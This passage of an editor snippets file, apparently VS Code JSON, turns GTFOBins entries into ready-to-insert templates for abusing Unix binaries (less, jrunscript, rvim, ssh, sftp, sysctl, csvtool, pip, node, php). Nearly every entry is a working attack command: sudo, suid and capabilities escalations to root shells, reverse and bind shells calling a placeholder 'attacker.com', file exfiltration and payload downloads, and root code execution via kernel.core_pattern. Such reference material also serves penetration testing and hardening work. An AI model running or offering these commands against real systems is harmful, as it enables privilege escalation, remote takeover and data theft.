        "body": [
            "abuse less with sudo",
            "",
            "```sh",
            "sudo less /etc/profile",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse less with sudo"
    },
    "less suid (gtfobins)": {
        "prefix": "less suid",
        "body": [
            "abuse less with suid",
            "",
            "```sh",
            "./less ${1:file_to_read}${0}",
            "```"
        ],
        "description": "abuse less with suid"
    },
    "jrunscript shell (gtfobins)": {
        "prefix": "jrunscript shell",
        "body": [
            "abuse jrunscript with shell",
            "",
            "```sh",
            "jrunscript -e \"exec('/bin/sh -c \\\\$@|sh _ echo sh <\\$(tty) >\\$(tty) 2>\\$(tty)')\"${0}",
            "```"
        ],
        "description": "abuse jrunscript with shell"
    },
    "jrunscript reverse-shell (gtfobins)": {
        "prefix": "jrunscript reverse-shell",
        "body": [
            "abuse jrunscript with reverse-shell, Run `nc -l -p 12345` on the attacker box to receive the shell.",
            "",
            "```sh",
            "export RHOST=${1:attacker.com}",
            "export RPORT=${2:12345}",
            "jrunscript -e 'var host='\"'\"\"\\$RHOST\"\"'\"'; var port='\"\\$RPORT\"';",
            "var p=new java.lang.ProcessBuilder(\"/bin/bash\", \"-i\").redirectErrorStream(true).start();",
            "var s=new java.net.Socket(host,port);",
            "var pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();",
            "var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){",
            "while(pi.available()>0)so.write(pi.read());",
            "while(pe.available()>0)so.write(pe.read());",
            "while(si.available()>0)po.write(si.read());",
            "so.flush();po.flush();",
            "java.lang.Thread.sleep(50);",
            "try {p.exitValue();break;}catch (e){}};p.destroy();s.close();'${0}",
            "```"
        ],
        "description": "abuse jrunscript with reverse-shell - Run `nc -l -p 12345` on the attacker box to receive the shell."
    },
    "jrunscript file-download (gtfobins)": {
        "prefix": "jrunscript file-download",
        "body": [
            "abuse jrunscript with file-download, Fetch a remote file via HTTP GET request.",
            "",
            "```sh",
            "URL=http://${2:attacker.com}/file_to_get",
            "LFILE=${1:file_to_save}",
            "jrunscript -e \"cp('\\$URL','\\$LFILE')\"${0}",
            "```"
        ],
        "description": "abuse jrunscript with file-download - Fetch a remote file via HTTP GET request."
    },
    "jrunscript file-write (gtfobins)": {
        "prefix": "jrunscript file-write",
        "body": [
            "abuse jrunscript with file-write",
            "",
            "```sh",
            "jrunscript -e 'var fw=new java.io.FileWriter(\"./${1:file_to_write}\"); fw.write(\"DATA\"); fw.close();'${0}",
            "```"
        ],
        "description": "abuse jrunscript with file-write"
    },
    "jrunscript file-read (gtfobins)": {
        "prefix": "jrunscript file-read",
        "body": [
            "abuse jrunscript with file-read",
            "",
            "```sh",
            "jrunscript -e 'br = new BufferedReader(new java.io.FileReader(\"${1:file_to_read}\"));",
            "while ((line = br.readLine()) != null) { print(line); }'${0}",
            "```"
        ],
        "description": "abuse jrunscript with file-read"
    },
    "jrunscript suid (gtfobins)": {
        "prefix": "jrunscript suid",
        "body": [
            "abuse jrunscript with suid, This has been found working in macOS but failing on Linux systems.",
            "",
            "```sh",
            "./jrunscript -e \"exec('/bin/sh -pc \\\\$@|sh\\${IFS}-p _ echo sh -p <\\$(tty) >\\$(tty) 2>\\$(tty)')\"${0}",
            "```"
        ],
        "description": "abuse jrunscript with suid - This has been found working in macOS but failing on Linux systems."
    },
    "jrunscript sudo (gtfobins)": {
        "prefix": "jrunscript sudo",
        "body": [
            "abuse jrunscript with sudo",
            "",
            "```sh",
            "sudo jrunscript -e \"exec('/bin/sh -c \\\\$@|sh _ echo sh <\\$(tty) >\\$(tty) 2>\\$(tty)')\"${0}",
            "```"
        ],
        "description": "abuse jrunscript with sudo"
    },
    "run-parts shell (gtfobins)": {
        "prefix": "run-parts shell",
        "body": [
            "abuse run-parts with shell",
            "",
            "```sh",
            "run-parts --new-session --regex '^sh\\$' /bin${0}",
            "```"
        ],
        "description": "abuse run-parts with shell"
    },
    "run-parts sudo (gtfobins)": {
        "prefix": "run-parts sudo",
        "body": [
            "abuse run-parts with sudo",
            "",
            "```sh",
            "sudo run-parts --new-session --regex '^sh\\$' /bin${0}",
            "```"
        ],
        "description": "abuse run-parts with sudo"
    },
    "run-parts suid (gtfobins)": {
        "prefix": "run-parts suid",
        "body": [
            "abuse run-parts with suid",
            "",
            "```sh",
            "./run-parts --new-session --regex '^sh\\$' /bin --arg='-p'${0}",
            "```"
        ],
        "description": "abuse run-parts with suid"
    },
    "rvim shell (gtfobins)": {
        "prefix": "rvim shell",
        "body": [
            "abuse rvim with shell, This requires that `rvim` is compiled with Lua support.",
            "",
            "```sh",
            "rvim -c ':lua os.execute(\"reset; exec sh\")'${0}",
            "```"
        ],
        "description": "abuse rvim with shell - This requires that `rvim` is compiled with Lua support."
    },
    "rvim reverse-shell (gtfobins)": {
        "prefix": "rvim reverse-shell",
        "body": [
            "abuse rvim with reverse-shell, This requires that `rvim` is compiled with Python support. Prepend `:py3` for Python 3. Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.",
            "",
            "```sh",
            "export RHOST=${1:attacker.com}",
            "export RPORT=${2:12345}",
            "rvim -c ':py import vim,sys,socket,os,pty;s=socket.socket()",
            "s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))",
            "[os.dup2(s.fileno(),fd) for fd in (0,1,2)]",
            "pty.spawn(\"/bin/sh\")",
            "vim.command(\":q!\")'${0}",
            "```"
        ],
        "description": "abuse rvim with reverse-shell - This requires that `rvim` is compiled with Python support. Prepend `:py3` for Python 3. Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell."
    },
    "rvim non-interactive-reverse-shell (gtfobins)": {
        "prefix": "rvim non-interactive-reverse-shell",
        "body": [
            "abuse rvim with non-interactive-reverse-shell, Run ``nc -l -p 12345`` on the attacker box to receive the shell. This requires that `rvim` is compiled with Lua support and that `lua-socket` is installed.",
            "",
            "```sh",
            "export RHOST=${1:attacker.com}",
            "export RPORT=${2:12345}",
            "rvim -c ':lua local s=require(\"socket\"); local t=assert(s.tcp());",
            "  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));",
            "  while true do",
            "    local r,x=t:receive();local f=assert(io.popen(r,\"r\"));",
            "    local b=assert(f:read(\"*a\"));t:send(b);",
            "  end;",
            "  f:close();t:close();'${0}",
            "```"
        ],
        "description": "abuse rvim with non-interactive-reverse-shell - Run ``nc -l -p 12345`` on the attacker box to receive the shell. This requires that `rvim` is compiled with Lua support and that `lua-socket` is installed."
    },
    "rvim non-interactive-bind-shell (gtfobins)": {
        "prefix": "rvim non-interactive-bind-shell",
        "body": [
            "abuse rvim with non-interactive-bind-shell, Run `nc target.com 12345` on the attacker box to connect to the shell. This requires that `rvim` is compiled with Lua support and that `lua-socket` is installed.",
            "",
            "```sh",
            "export LPORT=${1:12345}",
            "rvim -c ':lua local k=require(\"socket\");",
            "  local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));",
            "  local c=s:accept();",
            "  while true do",
            "    local r,x=c:receive();local f=assert(io.popen(r,\"r\"));",
            "    local b=assert(f:read(\"*a\"));c:send(b);",
            "  end;c:close();f:close();'${0}",
            "```"
        ],
        "description": "abuse rvim with non-interactive-bind-shell - Run `nc target.com 12345` on the attacker box to connect to the shell. This requires that `rvim` is compiled with Lua support and that `lua-socket` is installed."
    },
    "rvim file-upload (gtfobins)": {
        "prefix": "rvim file-upload",
        "body": [
            "abuse rvim with file-upload, Send a local file via TCP. Run `nc -l -p 12345 > \"file_to_save\"` on the attacker box to collect the file. This requires that `rvim` is compiled with Lua support and that `lua-socket` is installed.",
            "",
            "```sh",
            "export RHOST=${2:attacker.com}",
            "export RPORT=${3:12345}",
            "export LFILE=${1:file_to_send}",
            "rvim -c ':lua local f=io.open(os.getenv(\"LFILE\"), 'rb')",
            "  local d=f:read(\"*a\")",
            "  io.close(f);",
            "  local s=require(\"socket\");",
            "  local t=assert(s.tcp());",
            "  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));",
            "  t:send(d);",
            "  t:close();'${0}",
            "```"
        ],
        "description": "abuse rvim with file-upload - Send a local file via TCP. Run `nc -l -p 12345 > \"file_to_save\"` on the attacker box to collect the file. This requires that `rvim` is compiled with Lua support and that `lua-socket` is installed."
    },
    "rvim file-download (gtfobins)": {
        "prefix": "rvim file-download",
        "body": [
            "abuse rvim with file-download, Fetch a remote file via TCP. Run `nc target.com 12345 < \"file_to_send\"` on the attacker box to send the file. This requires that `rvim` is compiled with Lua support and that `lua-socket` is installed.",
            "",
            "```sh",
            "export LPORT=${2:12345}",
            "export LFILE=${1:file_to_save}",
            "rvim -c ':lua local k=require(\"socket\");",
            "  local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));",
            "  local c=s:accept();",
            "  local d,x=c:receive(\"*a\");",
            "  c:close();",
            "  local f=io.open(os.getenv(\"LFILE\"), \"wb\");",
            "  f:write(d);",
            "  io.close(f);'${0}",
            "```"
        ],
        "description": "abuse rvim with file-download - Fetch a remote file via TCP. Run `nc target.com 12345 < \"file_to_send\"` on the attacker box to send the file. This requires that `rvim` is compiled with Lua support and that `lua-socket` is installed."
    },
    "rvim file-write (gtfobins)": {
        "prefix": "rvim file-write",
        "body": [
            "abuse rvim with file-write",
            "",
            "```sh",
            "rvim ${1:file_to_write}",
            "iDATA",
            "^[",
            "w${0}",
            "```"
        ],
        "description": "abuse rvim with file-write"
    },
    "rvim file-read (gtfobins)": {
        "prefix": "rvim file-read",
        "body": [
            "abuse rvim with file-read",
            "",
            "```sh",
            "rvim ${1:file_to_read}${0}",
            "```"
        ],
        "description": "abuse rvim with file-read"
    },
    "rvim library-load (gtfobins)": {
        "prefix": "rvim library-load",
        "body": [
            "abuse rvim with library-load, This requires that `rvim` is compiled with Python support. Prepend `:py3` for Python 3.",
            "",
            "```sh",
            "rvim -c ':py import vim; from ctypes import cdll; cdll.LoadLibrary(\"lib.so\"); vim.command(\":q!\")'${0}",
            "```"
        ],
        "description": "abuse rvim with library-load - This requires that `rvim` is compiled with Python support. Prepend `:py3` for Python 3."
    },
    "rvim suid (gtfobins)": {
        "prefix": "rvim suid",
        "body": [
            "abuse rvim with suid, This requires that `rvim` is compiled with Python support. Prepend `:py3` for Python 3.",
            "",
            "```sh",
            "./rvim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'${0}",
            "```"
        ],
        "description": "abuse rvim with suid - This requires that `rvim` is compiled with Python support. Prepend `:py3` for Python 3."
    },
    "rvim sudo (gtfobins)": {
        "prefix": "rvim sudo",
        "body": [
            "abuse rvim with sudo, This requires that `rvim` is compiled with Lua support.",
            "",
            "```sh",
            "sudo rvim -c ':lua os.execute(\"reset; exec sh\")'${0}",
            "```"
        ],
        "description": "abuse rvim with sudo - This requires that `rvim` is compiled with Lua support."
    },
    "rvim capabilities (gtfobins)": {
        "prefix": "rvim capabilities",
        "body": [
            "abuse rvim with capabilities, This requires that `rvim` is compiled with Python support. Prepend `:py3` for Python 3.",
            "",
            "```sh",
            "./rvim -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'${0}",
            "```"
        ],
        "description": "abuse rvim with capabilities - This requires that `rvim` is compiled with Python support. Prepend `:py3` for Python 3."
    },
    "rvim limited-suid (gtfobins)": {
        "prefix": "rvim limited-suid",
        "body": [
            "abuse rvim with limited-suid, This requires that `rvim` is compiled with Lua support.",
            "",
            "```sh",
            "./rvim -c ':lua os.execute(\"reset; exec sh\")'${0}",
            "```"
        ],
        "description": "abuse rvim with limited-suid - This requires that `rvim` is compiled with Lua support."
    },
    "ascii85 file-read (gtfobins)": {
        "prefix": "ascii85 file-read",
        "body": [
            "abuse ascii85 with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "ascii85 \"\\$LFILE\" | ascii85 --decode${0}",
            "```"
        ],
        "description": "abuse ascii85 with file-read"
    },
    "ascii85 sudo (gtfobins)": {
        "prefix": "ascii85 sudo",
        "body": [
            "abuse ascii85 with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo ascii85 \"\\$LFILE\" | ascii85 --decode${0}",
            "```"
        ],
        "description": "abuse ascii85 with sudo"
    },
    "uudecode file-read (gtfobins)": {
        "prefix": "uudecode file-read",
        "body": [
            "abuse uudecode with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "uuencode \"\\$LFILE\" /dev/stdout | uudecode${0}",
            "```"
        ],
        "description": "abuse uudecode with file-read"
    },
    "uudecode suid (gtfobins)": {
        "prefix": "uudecode suid",
        "body": [
            "abuse uudecode with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "uuencode \"\\$LFILE\" /dev/stdout | uudecode${0}",
            "```"
        ],
        "description": "abuse uudecode with suid"
    },
    "uudecode sudo (gtfobins)": {
        "prefix": "uudecode sudo",
        "body": [
            "abuse uudecode with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo uuencode \"\\$LFILE\" /dev/stdout | uudecode${0}",
            "```"
        ],
        "description": "abuse uudecode with sudo"
    },
    "ssh shell (gtfobins)": {
        "prefix": "ssh shell",
        "body": [
            "abuse ssh with shell, Spawn interactive shell on client, requires a successful connection towards `host`.",
            "",
            "```sh",
            "ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh host${0}",
            "```"
        ],
        "description": "abuse ssh with shell - Spawn interactive shell on client, requires a successful connection towards `host`."
    },
    "ssh file-upload (gtfobins)": {
        "prefix": "ssh file-upload",
        "body": [
            "abuse ssh with file-upload, Send local file to a SSH server.",
            "",
            "```sh",
            "HOST=user@${3:attacker.com}",
            "RPATH=${2:file_to_save}",
            "LPATH=${1:file_to_send}",
            "ssh \\$HOST \"cat > \\$RPATH\" < \\$LPATH${0}",
            "```"
        ],
        "description": "abuse ssh with file-upload - Send local file to a SSH server."
    },
    "ssh file-download (gtfobins)": {
        "prefix": "ssh file-download",
        "body": [
            "abuse ssh with file-download, Fetch a remote file from a SSH server.",
            "",
            "```sh",
            "HOST=user@${2:attacker.com}",
            "RPATH=file_to_get",
            "LPATH=${1:file_to_save}",
            "ssh \\$HOST \"cat \\$RPATH\" > \\$LPATH${0}",
            "```"
        ],
        "description": "abuse ssh with file-download - Fetch a remote file from a SSH server."
    },
    "ssh file-read (gtfobins)": {
        "prefix": "ssh file-read",
        "body": [
            "abuse ssh with file-read, The read file content is corrupted by error prints.",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "ssh -F \\$LFILE localhost${0}",
            "```"
        ],
        "description": "abuse ssh with file-read - The read file content is corrupted by error prints."
    },
    "ssh sudo (gtfobins)": {
        "prefix": "ssh sudo",
        "body": [
            "abuse ssh with sudo, Spawn interactive root shell through ProxyCommand option.",
            "",
            "```sh",
            "sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x${0}",
            "```"
        ],
        "description": "abuse ssh with sudo - Spawn interactive root shell through ProxyCommand option."
    },
    "sftp shell (gtfobins)": {
        "prefix": "sftp shell",
        "body": [
            "abuse sftp with shell",
            "",
            "```sh",
            "HOST=user@${1:attacker.com}",
            "sftp \\$HOST",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse sftp with shell"
    },
    "sftp file-upload (gtfobins)": {
        "prefix": "sftp file-upload",
        "body": [
            "abuse sftp with file-upload, Send local file to a SSH server.",
            "",
            "```sh",
            "RHOST=user@${3:attacker.com}",
            "sftp \\$RHOST",
            "put ${1:file_to_send} ${2:file_to_save}${0}",
            "```"
        ],
        "description": "abuse sftp with file-upload - Send local file to a SSH server."
    },
    "sftp file-download (gtfobins)": {
        "prefix": "sftp file-download",
        "body": [
            "abuse sftp with file-download, Fetch a remote file from a SSH server.",
            "",
            "```sh",
            "RHOST=user@${2:attacker.com}",
            "sftp \\$RHOST",
            "get file_to_get ${1:file_to_save}${0}",
            "```"
        ],
        "description": "abuse sftp with file-download - Fetch a remote file from a SSH server."
    },
    "sftp sudo (gtfobins)": {
        "prefix": "sftp sudo",
        "body": [
            "abuse sftp with sudo",
            "",
            "```sh",
            "HOST=user@${1:attacker.com}",
            "sudo sftp \\$HOST",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse sftp with sudo"
    },
    "sysctl command (gtfobins)": {
        "prefix": "sysctl command",
        "body": [
            "abuse sysctl with command, The command is executed by root in the background when a core dump occurs.",
            "",
            "```sh",
            "COMMAND='/bin/sh -c id>/tmp/id'",
            "sysctl \"kernel.core_pattern=|\\$COMMAND\"",
            "sleep 9999 &",
            "kill -QUIT \\$!",
            "cat /tmp/id${0}",
            "```"
        ],
        "description": "abuse sysctl with command - The command is executed by root in the background when a core dump occurs."
    },
    "sysctl file-read (gtfobins)": {
        "prefix": "sysctl file-read",
        "body": [
            "abuse sysctl with file-read, The `-p` argument can also be used in place of `-n`. In both cases though the output might get corrupted, so this might not be suitable to read binary files.",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "/usr/sbin/sysctl -n \"/../../\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse sysctl with file-read - The `-p` argument can also be used in place of `-n`. In both cases though the output might get corrupted, so this might not be suitable to read binary files."
    },
    "sysctl suid (gtfobins)": {
        "prefix": "sysctl suid",
        "body": [
            "abuse sysctl with suid",
            "",
            "```sh",
            "COMMAND='/bin/sh -c id>/tmp/id'",
            "./sysctl \"kernel.core_pattern=|\\$COMMAND\"",
            "sleep 9999 &",
            "kill -QUIT \\$!",
            "cat /tmp/id${0}",
            "```"
        ],
        "description": "abuse sysctl with suid"
    },
    "sysctl sudo (gtfobins)": {
        "prefix": "sysctl sudo",
        "body": [
            "abuse sysctl with sudo",
            "",
            "```sh",
            "COMMAND='/bin/sh -c id>/tmp/id'",
            "sudo sysctl \"kernel.core_pattern=|\\$COMMAND\"",
            "sleep 9999 &",
            "kill -QUIT \\$!",
            "cat /tmp/id${0}",
            "```"
        ],
        "description": "abuse sysctl with sudo"
    },
    "csvtool file-read (gtfobins)": {
        "prefix": "csvtool file-read",
        "body": [
            "abuse csvtool with file-read, The file is actually parsed and manipulated as CSV, so this might not be suitable for arbitrary data.",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "csvtool trim t \\$LFILE${0}",
            "```"
        ],
        "description": "abuse csvtool with file-read - The file is actually parsed and manipulated as CSV, so this might not be suitable for arbitrary data."
    },
    "csvtool file-write (gtfobins)": {
        "prefix": "csvtool file-write",
        "body": [
            "abuse csvtool with file-write, The file is actually parsed and manipulated as CSV, so this might not be suitable for arbitrary data.",
            "",
            "```sh",
            "LFILE=${1:file_to_write}",
            "TF=\\$(mktemp)",
            "echo DATA > \\$TF",
            "csvtool trim t \\$TF -o \\$LFILE${0}",
            "```"
        ],
        "description": "abuse csvtool with file-write - The file is actually parsed and manipulated as CSV, so this might not be suitable for arbitrary data."
    },
    "csvtool suid (gtfobins)": {
        "prefix": "csvtool suid",
        "body": [
            "abuse csvtool with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./csvtool trim t \\$LFILE${0}",
            "```"
        ],
        "description": "abuse csvtool with suid"
    },
    "csvtool shell (gtfobins)": {
        "prefix": "csvtool shell",
        "body": [
            "abuse csvtool with shell",
            "",
            "```sh",
            "csvtool call '/bin/sh;false' /etc/passwd${0}",
            "```"
        ],
        "description": "abuse csvtool with shell"
    },
    "csvtool sudo (gtfobins)": {
        "prefix": "csvtool sudo",
        "body": [
            "abuse csvtool with sudo",
            "",
            "```sh",
            "sudo csvtool call '/bin/sh;false' /etc/passwd${0}",
            "```"
        ],
        "description": "abuse csvtool with sudo"
    },
    "pip shell (gtfobins)": {
        "prefix": "pip shell",
        "body": [
            "abuse pip with shell",
            "",
            "```sh",
            "TF=\\$(mktemp -d)",
            "echo \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh <\\$(tty) >\\$(tty) 2>\\$(tty)')\" > \\$TF/setup.py",
            "pip install \\$TF${0}",
            "```"
        ],
        "description": "abuse pip with shell"
    },
    "pip reverse-shell (gtfobins)": {
        "prefix": "pip reverse-shell",
        "body": [
            "abuse pip with reverse-shell, Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.",
            "",
            "```sh",
            "export RHOST=${1:attacker.com}",
            "export RPORT=${2:12345}",
            "TF=\\$(mktemp -d)",
            "echo 'import sys,socket,os,pty;s=socket.socket()",
            "s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))",
            "[os.dup2(s.fileno(),fd) for fd in (0,1,2)]",
            "pty.spawn(\"/bin/sh\")' > \\$TF/setup.py",
            "pip install \\$TF${0}",
            "```"
        ],
        "description": "abuse pip with reverse-shell - Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell."
    },
    "pip file-upload (gtfobins)": {
        "prefix": "pip file-upload",
        "body": [
            "abuse pip with file-upload, Serve files in the local folder running an HTTP server.",
            "",
            "```sh",
            "export LPORT=8888",
            "TF=\\$(mktemp -d)",
            "echo 'import sys; from os import environ as e",
            "if sys.version_info.major == 3: import http.server as s, socketserver as ss",
            "else: import SimpleHTTPServer as s, SocketServer as ss",
            "ss.TCPServer((\"\", int(e[\"LPORT\"])), s.SimpleHTTPRequestHandler).serve_forever()' > \\$TF/setup.py",
            "pip install \\$TF${0}",
            "```"
        ],
        "description": "abuse pip with file-upload - Serve files in the local folder running an HTTP server."
    },
    "pip file-download (gtfobins)": {
        "prefix": "pip file-download",
        "body": [
            "abuse pip with file-download, Fetch a remote file via HTTP GET request. It needs an absolute local file path.",
            "",
            "```sh",
            "export URL=http://${2:attacker.com}/file_to_get",
            "export LFILE=/tmp/${1:file_to_save}",
            "TF=\\$(mktemp -d)",
            "echo 'import sys; from os import environ as e",
            "if sys.version_info.major == 3: import urllib.request as r",
            "else: import urllib as r",
            "r.urlretrieve(e[\"URL\"], e[\"LFILE\"])' > \\$TF/setup.py",
            "pip install \\$TF${0}",
            "```"
        ],
        "description": "abuse pip with file-download - Fetch a remote file via HTTP GET request. It needs an absolute local file path."
    },
    "pip file-write (gtfobins)": {
        "prefix": "pip file-write",
        "body": [
            "abuse pip with file-write, It needs an absolute local file path.",
            "",
            "```sh",
            "export LFILE=/tmp/${1:file_to_save}",
            "TF=\\$(mktemp -d)",
            "echo \"open('\\$LFILE','w+').write('DATA')\" > \\$TF/setup.py",
            "pip install \\$TF${0}",
            "```"
        ],
        "description": "abuse pip with file-write - It needs an absolute local file path."
    },
    "pip file-read (gtfobins)": {
        "prefix": "pip file-read",
        "body": [
            "abuse pip with file-read, The read file content is corrupted as wrapped within an exception error.",
            "",
            "```sh",
            "TF=\\$(mktemp -d)",
            "echo 'raise Exception(open(\"${1:file_to_read}\").read())' > \\$TF/setup.py",
            "pip install \\$TF${0}",
            "```"
        ],
        "description": "abuse pip with file-read - The read file content is corrupted as wrapped within an exception error."
    },
    "pip library-load (gtfobins)": {
        "prefix": "pip library-load",
        "body": [
            "abuse pip with library-load",
            "",
            "```sh",
            "TF=\\$(mktemp -d)",
            "echo 'from ctypes import cdll; cdll.LoadLibrary(\"lib.so\")' > \\$TF/setup.py",
            "pip install \\$TF${0}",
            "```"
        ],
        "description": "abuse pip with library-load"
    },
    "pip sudo (gtfobins)": {
        "prefix": "pip sudo",
        "body": [
            "abuse pip with sudo",
            "",
            "```sh",
            "TF=\\$(mktemp -d)",
            "echo \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh <\\$(tty) >\\$(tty) 2>\\$(tty)')\" > \\$TF/setup.py",
            "sudo pip install \\$TF${0}",
            "```"
        ],
        "description": "abuse pip with sudo"
    },
    "node shell (gtfobins)": {
        "prefix": "node shell",
        "body": [
            "abuse node with shell",
            "",
            "```sh",
            "node -e 'require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0, 1, 2]})'${0}",
            "```"
        ],
        "description": "abuse node with shell"
    },
    "node file-write (gtfobins)": {
        "prefix": "node file-write",
        "body": [
            "abuse node with file-write",
            "",
            "```sh",
            "node -e 'require(\"fs\").writeFileSync(\"${1:file_to_write}\", \"DATA\")'${0}",
            "```"
        ],
        "description": "abuse node with file-write"
    },
    "node file-read (gtfobins)": {
        "prefix": "node file-read",
        "body": [
            "abuse node with file-read",
            "",
            "```sh",
            "node -e 'process.stdout.write(require(\"fs\").readFileSync(\"/bin/ls\"))'${0}",
            "```"
        ],
        "description": "abuse node with file-read"
    },
    "node file-download (gtfobins)": {
        "prefix": "node file-download",
        "body": [
            "abuse node with file-download, Fetch a remote file via HTTP GET request.",
            "",
            "```sh",
            "export URL=http://${2:attacker.com}/file_to_get",
            "export LFILE=${1:file_to_save}",
            "node -e 'require(\"http\").get(process.env.URL, res => res.pipe(require(\"fs\").createWriteStream(process.env.LFILE)))'${0}",
            "```"
        ],
        "description": "abuse node with file-download - Fetch a remote file via HTTP GET request."
    },
    "node file-upload (gtfobins)": {
        "prefix": "node file-upload",
        "body": [
            "abuse node with file-upload, Send a local file via HTTP POST request.",
            "",
            "```sh",
            "export URL=http://${2:attacker.com}",
            "export LFILE=${1:file_to_send}",
            "node -e 'require(\"fs\").createReadStream(process.env.LFILE).pipe(require(\"http\").request(process.env.URL))'${0}",
            "```"
        ],
        "description": "abuse node with file-upload - Send a local file via HTTP POST request."
    },
    "node reverse-shell (gtfobins)": {
        "prefix": "node reverse-shell",
        "body": [
            "abuse node with reverse-shell, Run `nc -l -p 12345` on the attacker box to receive the shell.",
            "",
            "```sh",
            "export RHOST=${1:attacker.com}",
            "export RPORT=${2:12345}",
            "node -e 'sh = require(\"child_process\").spawn(\"/bin/sh\");",
            "require(\"net\").connect(process.env.RPORT, process.env.RHOST, function () {",
            "  this.pipe(sh.stdin);",
            "  sh.stdout.pipe(this);",
            "  sh.stderr.pipe(this);",
            "})'${0}",
            "```"
        ],
        "description": "abuse node with reverse-shell - Run `nc -l -p 12345` on the attacker box to receive the shell."
    },
    "node bind-shell (gtfobins)": {
        "prefix": "node bind-shell",
        "body": [
            "abuse node with bind-shell, Run `nc target.com 12345` on the attacker box to connect to the shell.",
            "",
            "```sh",
            "export LPORT=${1:12345}",
            "node -e 'sh = require(\"child_process\").spawn(\"/bin/sh\");",
            "require(\"net\").createServer(function (client) {",
            "  client.pipe(sh.stdin);",
            "  sh.stdout.pipe(client);",
            "  sh.stderr.pipe(client);",
            "}).listen(process.env.LPORT)'${0}",
            "```"
        ],
        "description": "abuse node with bind-shell - Run `nc target.com 12345` on the attacker box to connect to the shell."
    },
    "node suid (gtfobins)": {
        "prefix": "node suid",
        "body": [
            "abuse node with suid",
            "",
            "```sh",
            "./node -e 'require(\"child_process\").spawn(\"/bin/sh\", [\"-p\"], {stdio: [0, 1, 2]})'${0}",
            "```"
        ],
        "description": "abuse node with suid"
    },
    "node sudo (gtfobins)": {
        "prefix": "node sudo",
        "body": [
            "abuse node with sudo",
            "",
            "```sh",
            "sudo node -e 'require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0, 1, 2]})'${0}",
            "```"
        ],
        "description": "abuse node with sudo"
    },
    "node capabilities (gtfobins)": {
        "prefix": "node capabilities",
        "body": [
            "abuse node with capabilities",
            "",
            "```sh",
            "./node -e 'process.setuid(0); require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0, 1, 2]})'${0}",
            "```"
        ],
        "description": "abuse node with capabilities"
    },
    "php shell (gtfobins)": {
        "prefix": "php shell",
        "body": [
            "abuse php with shell",
            "",
            "```sh",
            "export CMD=\"/bin/sh\"",
            "php -r '\\$h=@popen(getenv(\"CMD\"),\"r\"); if(\\$h){ while(!feof(\\$h)) echo(fread(\\$h,4096)); pclose(\\$h); }'${0}",
            "```"
        ],
        "description": "abuse php with shell"
    },
    "php command (gtfobins)": {
        "prefix": "php command",
        "body": [
            "abuse php with command",
            "",
            "```sh",
            "export CMD=\"id\"",
            "php -r '\\$p = array(array(\"pipe\",\"r\"),array(\"pipe\",\"w\"),array(\"pipe\", \"w\"));\\$h = @proc_open(getenv(\"CMD\"), \\$p, \\$pipes);if(\\$h&&\\$pipes){while(!feof(\\$pipes[1])) echo(fread(\\$pipes[1],4096));while(!feof(\\$pipes[2])) echo(fread(\\$pipes[2],4096));fclose(\\$pipes[0]);fclose(\\$pipes[1]);fclose(\\$pipes[2]);proc_close(\\$h);}'${0}",
            "```"
        ],
        "description": "abuse php with command"
    },
    "php reverse-shell (gtfobins)": {
        "prefix": "php reverse-shell",
        "body": [
            "abuse php with reverse-shell, Run `nc -l -p 12345` on the attacker box to receive the shell.",
            "",
            "```sh",
            "export RHOST=${1:attacker.com}",
            "export RPORT=${2:12345}",
            "php -r '\\$sock=fsockopen(getenv(\"RHOST\"),getenv(\"RPORT\"));exec(\"/bin/sh -i <&3 >&3 2>&3\");'${0}",
            "```"
        ],
        "description": "abuse php with reverse-shell - Run `nc -l -p 12345` on the attacker box to receive the shell."
    },
    "php file-upload (gtfobins)": {
        "prefix": "php file-upload",
        "body": [
            "abuse php with file-upload, Serve files in the local folder running an HTTP server. This requires PHP version 5.4 or later.",
            "",
            "```sh",
            "LHOST=0.0.0.0",
            "LPORT=8888",
            "php -S \\$LHOST:\\$LPORT${0}",
            "```"
        ],
        "description": "abuse php with file-upload - Serve files in the local folder running an HTTP server. This requires PHP version 5.4 or later."
    },
    "php file-download (gtfobins)": {
        "prefix": "php file-download",
        "body": [
            "abuse php with file-download, Fetch a remote file via HTTP GET request.",
            "",
            "```sh",
            "export URL=http://${2:attacker.com}/file_to_get",
            "export LFILE=${1:file_to_save}",
            "php -r '\\$c=file_get_contents(getenv(\"URL\"));file_put_contents(getenv(\"LFILE\"), \\$c);'${0}",
            "```"
        ],
